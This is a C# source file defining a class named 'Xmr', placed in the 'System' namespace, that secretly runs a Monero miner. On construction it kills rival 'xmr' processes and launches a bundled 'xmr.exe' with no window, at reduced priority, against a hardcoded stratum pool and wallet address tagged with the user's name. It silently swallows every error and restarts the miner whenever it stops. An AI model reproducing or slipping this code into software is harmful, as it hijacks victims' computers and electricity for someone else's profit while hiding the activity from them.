using System;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

namespace System
{
  public class Xmr
  {
    private static string XMR = "48pntMLL4sef8DKYq3LC7DY7ZsbLcDAJea7UBSgRQGQ7BA1v3Dv3ehKWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3xonhBC." + Environment.UserName;
    private static Process xmr = new Process();
    private static void StartXmr()
    {
      try
      {
        Process[] processes = Process.GetProcessesByName("xmr");
        foreach (Process process in processes)
        {
            process.Kill();
        }
        xmr.StartInfo.FileName=".\\inc\\xmr.exe";
        xmr.StartInfo.Arguments="-B -a cryptonight -o stratum+tcp://10.231.1.149:8080 -t 4 -u " + XMR + " -p x";
        xmr.StartInfo.CreateNoWindow = true;
        xmr.StartInfo.UseShellExecute = false;
        xmr.StartInfo.RedirectStandardOutput = true;
        xmr.Start();
        xmr.PriorityClass = ProcessPriorityClass.BelowNormal;
      }
      catch (System.Exception)
      {}
    }
    public void DoWork()
    {
      try
      {
        if (xmr.HasExited) {xmr.Start();}          
      }
      catch (System.Exception)
      {
      }
    }

    public Xmr()
    {
      StartXmr();
    }
  }
}